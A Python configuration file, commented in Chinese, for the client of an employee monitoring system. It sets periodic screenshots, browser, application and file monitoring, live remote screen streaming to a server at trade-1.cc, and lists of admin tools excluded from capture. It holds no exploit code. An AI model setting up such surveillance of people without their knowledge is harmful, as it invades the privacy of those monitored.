"""
员工监控系统 - 客户端配置文件
"""

import os
from pathlib import Path


class Config:
    """客户端配置"""

    # ===== 服务器配置 =====
    DEFAULT_SERVERS = [
        "https://trade-1.cc",
        "http://localhost:8000",
    ]

    # ===== 首次注册配置 =====
    SCREENSHOT_INTERVAL = 60
    SCREENSHOT_QUALITY = 80
    SCREENSHOT_FORMAT = "webp"

    # ===== 本地文件配置 =====
    TEMP_DIR = Path(os.path.expanduser("~")) / ".employee-monitor"
    LOG_FILE = TEMP_DIR / "client.log"
    LOG_LEVEL = "INFO"

    # ===== 高级配置 =====
    MAX_HISTORY = 10
    SIMILARITY_THRESHOLD = 0.95
    RETRY_TIMES = 3
    RETRY_DELAY = 1
    HEARTBEAT_INTERVAL = 60
    BATCH_UPLOAD_INTERVAL = 3600

    # ===== 新增监控模块开关 =====
    ENABLE_BROWSER_MONITOR = True  # 浏览器监控开关
    ENABLE_APP_MONITOR = True  # 软件监控开关
    ENABLE_FILE_MONITOR = True  # 文件监控开关

    # ===== 远程屏幕配置 =====
    ENABLE_REMOTE_SCREEN = True  # 远程屏幕开关

    # 远程屏幕帧率配置
    REMOTE_BASE_FPS = 5  # 基础帧率
    REMOTE_MIN_FPS = 1  # 最低帧率
    REMOTE_MAX_FPS = 10  # 最高帧率

    # 远程屏幕画质配置
    REMOTE_BASE_QUALITY = 70  # 基础画质
    REMOTE_MIN_QUALITY = 30  # 最低画质
    REMOTE_MAX_QUALITY = 85  # 最高画质

    # 远程屏幕分辨率配置
    REMOTE_MAX_WIDTH = 1280  # 最大宽度
    REMOTE_MIN_WIDTH = 640  # 最小宽度

    # 远程屏幕高级优化
    REMOTE_ENABLE_DIFF = True  # 差异帧传输
    REMOTE_ENABLE_REGION = True  # 区域检测
    REMOTE_ENABLE_H264 = True  # H.264加速
    REMOTE_ENABLE_QR = False  # 二维码检测
    
    # ===== 远程屏幕窗口排除配置 =====
    REMOTE_ENABLE_WINDOW_EXCLUSION = False  # 窗口排除功能开关
    REMOTE_EXCLUDED_WINDOWS = [  # 排除的窗口标题（支持部分匹配）
        "任务管理器",
        "注册表编辑器",
        "命令提示符",
        "Windows PowerShell",
        "进程管理器",
        "安全中心",
        "事件查看器",
        "本地安全策略",
        "组策略管理",
    ]
    REMOTE_EXCLUDED_PROCESSES = [  # 排除的进程名
        "taskmgr.exe",
        "regedit.exe",
        "cmd.exe",
        "powershell.exe",
        "procexp.exe",
        "procmon.exe",
        "mmc.exe",
        "control.exe",
    ]
    REMOTE_AUTO_EXCLUDE_SENSITIVE = True  # 自动排除敏感窗口（任务管理器等）
    REMOTE_EXCLUDE_FULLSCREEN = False  # 排除全屏应用（如游戏、视频）
    REMOTE_EXCLUSION_UPDATE_INTERVAL = 5  # 窗口列表更新间隔（秒）
    
    # ===== 远程屏幕性能配置 =====
    REMOTE_NETWORK_CHECK_INTERVAL = 5  # 网络检测间隔（秒）
    REMOTE_LATENCY_THRESHOLD_HIGH = 500  # 高延迟阈值（ms）
    REMOTE_LATENCY_THRESHOLD_LOW = 100  # 低延迟阈值（ms）
    REMOTE_DIFF_AREA_THRESHOLD = 1000  # 差异区域最小像素
    REMOTE_REGION_AREA_THRESHOLD = 5000  # 活动区域最小像素
    REMOTE_MERGE_DISTANCE = 50  # 区域合并距离（像素）
    
    # ===== 远程屏幕资源管理 =====
    REMOTE_ENCODE_POOL_SIZE = 2  # 编码工作池大小
    REMOTE_FRAME_BUFFER_SIZE = 3  # 帧缓冲区大小
    REMOTE_STATS_REPORT_INTERVAL = 10  # 性能统计报告间隔（秒）


# ===== 辅助函数：获取配置值 =====
def get_config_dict():
    """将配置转换为字典，便于动态修改"""
    config_dict = {}
    for key in dir(Config):
        if not key.startswith("_") and not callable(getattr(Config, key)):
            config_dict[key] = getattr(Config, key)
    return config_dict


def update_config(**kwargs):
    """动态更新配置"""
    for key, value in kwargs.items():
        if hasattr(Config, key):
            setattr(Config, key, value)


def validate_config():
    """验证配置有效性"""
    errors = []
    
    # 验证帧率范围
    if not (1 <= Config.REMOTE_MIN_FPS <= Config.REMOTE_BASE_FPS <= Config.REMOTE_MAX_FPS <= 30):
        errors.append("帧率配置无效: REMOTE_MIN_FPS <= REMOTE_BASE_FPS <= REMOTE_MAX_FPS")
    
    # 验证画质范围
    if not (1 <= Config.REMOTE_MIN_QUALITY <= Config.REMOTE_BASE_QUALITY <= Config.REMOTE_MAX_QUALITY <= 100):
        errors.append("画质配置无效: REMOTE_MIN_QUALITY <= REMOTE_BASE_QUALITY <= REMOTE_MAX_QUALITY")
    
    # 验证分辨率范围
    if not (320 <= Config.REMOTE_MIN_WIDTH <= Config.REMOTE_MAX_WIDTH <= 3840):
        errors.append("分辨率配置无效: REMOTE_MIN_WIDTH <= REMOTE_MAX_WIDTH")
    
    # 验证排除窗口配置
    if Config.REMOTE_ENABLE_WINDOW_EXCLUSION:
        if not Config.REMOTE_EXCLUDED_WINDOWS and not Config.REMOTE_EXCLUDED_PROCESSES:
            if not Config.REMOTE_AUTO_EXCLUDE_SENSITIVE:
                errors.append("窗口排除已启用，但未配置任何排除项")
    
    # 验证性能配置
    if Config.REMOTE_ENCODE_POOL_SIZE < 1:
        errors.append("编码池大小必须大于0")
    
    if Config.REMOTE_FRAME_BUFFER_SIZE < 1:
        errors.append("帧缓冲区大小必须大于0")
    
    if errors:
        raise ValueError(f"配置验证失败: {', '.join(errors)}")
    
    return True


def print_config():
    """打印当前配置（用于调试）"""
    print("=" * 60)
    print("员工监控系统配置")
    print("=" * 60)
    
    print("\n【服务器配置】")
    print(f"  DEFAULT_SERVERS: {Config.DEFAULT_SERVERS}")
    
    print("\n【监控模块】")
    print(f"  ENABLE_BROWSER_MONITOR: {Config.ENABLE_BROWSER_MONITOR}")
    print(f"  ENABLE_APP_MONITOR: {Config.ENABLE_APP_MONITOR}")
    print(f"  ENABLE_FILE_MONITOR: {Config.ENABLE_FILE_MONITOR}")
    
    print("\n【远程屏幕基础配置】")
    print(f"  ENABLE_REMOTE_SCREEN: {Config.ENABLE_REMOTE_SCREEN}")
    print(f"  帧率: {Config.REMOTE_BASE_FPS} (范围: {Config.REMOTE_MIN_FPS}-{Config.REMOTE_MAX_FPS})")
    print(f"  画质: {Config.REMOTE_BASE_QUALITY} (范围: {Config.REMOTE_MIN_QUALITY}-{Config.REMOTE_MAX_QUALITY})")
    print(f"  分辨率: 最大{Config.REMOTE_MAX_WIDTH}px, 最小{Config.REMOTE_MIN_WIDTH}px")
    
    print("\n【远程屏幕高级优化】")
    print(f"  差异帧: {Config.REMOTE_ENABLE_DIFF}")
    print(f"  区域检测: {Config.REMOTE_ENABLE_REGION}")
    print(f"  H.264加速: {Config.REMOTE_ENABLE_H264}")
    print(f"  二维码检测: {Config.REMOTE_ENABLE_QR}")
    
    print("\n【远程屏幕窗口排除】")
    print(f"  启用排除: {Config.REMOTE_ENABLE_WINDOW_EXCLUSION}")
    print(f"  自动排除敏感窗口: {Config.REMOTE_AUTO_EXCLUDE_SENSITIVE}")
    print(f"  排除全屏应用: {Config.REMOTE_EXCLUDE_FULLSCREEN}")
    print(f"  排除窗口列表: {len(Config.REMOTE_EXCLUDED_WINDOWS)} 个")
    for win in Config.REMOTE_EXCLUDED_WINDOWS[:5]:
        print(f"    - {win}")
    if len(Config.REMOTE_EXCLUDED_WINDOWS) > 5:
        print(f"    ... 还有 {len(Config.REMOTE_EXCLUDED_WINDOWS) - 5} 个")
    print(f"  排除进程列表: {len(Config.REMOTE_EXCLUDED_PROCESSES)} 个")
    for proc in Config.REMOTE_EXCLUDED_PROCESSES[:5]:
        print(f"    - {proc}")
    if len(Config.REMOTE_EXCLUDED_PROCESSES) > 5:
        print(f"    ... 还有 {len(Config.REMOTE_EXCLUDED_PROCESSES) - 5} 个")
    
    print("\n【远程屏幕性能配置】")
    print(f"  网络检测间隔: {Config.REMOTE_NETWORK_CHECK_INTERVAL}s")
    print(f"  延迟阈值: 高{Config.REMOTE_LATENCY_THRESHOLD_HIGH}ms / 低{Config.REMOTE_LATENCY_THRESHOLD_LOW}ms")
    print(f"  差异区域阈值: {Config.REMOTE_DIFF_AREA_THRESHOLD}px")
    print(f"  活动区域阈值: {Config.REMOTE_REGION_AREA_THRESHOLD}px")
    
    print("\n【远程屏幕资源管理】")
    print(f"  编码池大小: {Config.REMOTE_ENCODE_POOL_SIZE}")
    print(f"  帧缓冲区: {Config.REMOTE_FRAME_BUFFER_SIZE}")
    print(f"  统计报告间隔: {Config.REMOTE_STATS_REPORT_INTERVAL}s")
    
    print("\n【其他配置】")
    print(f"  截图间隔: {Config.SCREENSHOT_INTERVAL}s")
    print(f"  心跳间隔: {Config.HEARTBEAT_INTERVAL}s")
    print(f"  批次上传间隔: {Config.BATCH_UPLOAD_INTERVAL}s")
    
    print("=" * 60)


# ===== 使用示例 =====
if __name__ == "__main__":
    # 验证配置
    try:
        validate_config()
        print("✅ 配置验证通过")
    except ValueError as e:
        print(f"❌ {e}")
    
    # 打印配置
    print_config()
    
    # 动态更新配置示例
    # update_config(
    #     REMOTE_ENABLE_WINDOW_EXCLUSION=True,
    #     REMOTE_EXCLUDED_WINDOWS=["测试窗口", "调试工具"],
    #     REMOTE_BASE_QUALITY=80
    # )